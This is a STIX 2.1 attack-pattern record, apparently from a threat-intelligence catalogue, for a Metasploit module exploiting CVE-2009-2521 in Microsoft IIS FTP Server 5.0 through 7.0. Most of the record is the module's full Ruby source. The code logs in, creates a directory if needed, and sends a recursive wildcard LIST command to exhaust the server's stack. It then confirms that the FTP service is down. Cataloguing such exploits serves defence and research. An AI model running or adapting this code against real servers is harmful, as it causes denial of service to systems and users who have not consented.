{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7cf00177-9ce2-4b3e-bb5c-3321b5f814e8",
    "created": "2024-08-14T16:25:22.337733Z",
    "modified": "2024-08-14T16:25:22.337737Z",
    "name": "Microsoft IIS FTP Server LIST Stack Exhaustion",
    "description": " This module triggers Denial of Service condition in the Microsoft Internet Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command containing a wildcard. For this exploit to work in most cases, you need 1) a valid ftp account: either read-only or write-access account 2) the \"FTP Publishing\" must be configured as \"manual\" mode in startup type 3) there must be at least one directory under FTP root directory. If your provided an FTP account has write-access privilege and there is no single directory, a new directory with random name will be created prior to sending exploit payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/ftp/iis_list_exhaustion.rb",
            "external_id": "iis_list_exhaustion.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2521"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft IIS FTP Server LIST Stack Exhaustion',\n      'Description'    => %q{\n          This module triggers Denial of Service condition in the Microsoft Internet\n        Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command\n        containing a wildcard. For this exploit to work in most cases, you need 1) a valid\n        ftp account: either read-only or write-access account 2) the \"FTP Publishing\" must\n        be configured as \"manual\" mode in startup type 3) there must be at least one\n        directory under FTP root directory. If your provided an FTP account has write-access\n        privilege and there is no single directory, a new directory with random name will be\n        created prior to sending exploit payload.\n      },\n      'Author'         =>\n        [\n          'Kingcope', # Initial discovery\n          'Myo Soe'   # Metasploit Module (http://yehg.net)\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-2521'],\n          [ 'BID', '36273'],\n          [ 'OSVDB', '57753'],\n          [ 'MSB', 'MS09-053'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html']\n        ],\n      'DisclosureDate' => '2009-09-03'))\n  end\n\n  def run\n    # Attempt to crash IIS FTP\n    begin\n      return unless connect_login\n      print_status('Checking if there is at least one directory ...')\n      res = send_cmd_data(['ls'],'')\n\n      if res.to_s =~ /\\<DIR\\>          / then\n        print_status('Directory found, skipped creating a directory')\n      else\n        print_status('No single directory found')\n        print_status('Attempting to create a directory ...')\n        new_dir = Rex::Text.rand_text_alphanumeric(6)\n        res = send_cmd(['mkd',new_dir])\n        if res =~ /directory created/ then\n          print_status(\"New directory \\\"#{new_dir}\\\" was created!\")\n        else\n          print_error('Write-access was denied')\n          print_error('Exploit failed')\n          disconnect\n          return\n        end\n      end\n\n      print_status(\"Sending DoS packets ...\")\n      res = send_cmd_datax(['ls','-R */../'],' ')\n      disconnect\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Cannot connect. The server is not running.\")\n      return\n    rescue Rex::ConnectionTimeout\n      print_error(\"Cannot connect. The connection timed out.\")\n      return\n    rescue\n    end\n\n    #More careful way to check DOS\n    print_status(\"Checking server's status...\")\n    begin\n      connect_login\n      disconnect\n      print_error(\"DOS attempt failed.  The service is still running.\")\n    rescue\n      print_good(\"Success! Service is down\")\n    end\n  end\n\n  # Workaround: modified send_cmd_data function with short sleep time before data_disconnect call\n  # Bug Tracker: 4868\n  def send_cmd_datax(args, data, mode = 'a', nsock = self.sock)\n    args[0] = \"LIST\"\n    # Set the transfer mode and connect to the remove server\n    return nil if not data_connect(mode)\n    # Our pending command should have got a connection now.\n    res = send_cmd(args, true, nsock)\n    # make sure could open port\n    return nil unless res =~ /^(150|125) /\n    # dispatch to the proper method\n    begin\n      data = self.datasocket.get_once(-1, ftp_timeout)\n    rescue ::EOFError\n      data = nil\n    end\n    select(nil,nil,nil,1)\n    # close data channel so command channel updates\n    data_disconnect\n    # get status of transfer\n    ret = nil\n    ret = recv_ftp_resp(nsock)\n    ret = [ ret, data ]\n    ret\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-09-03"
}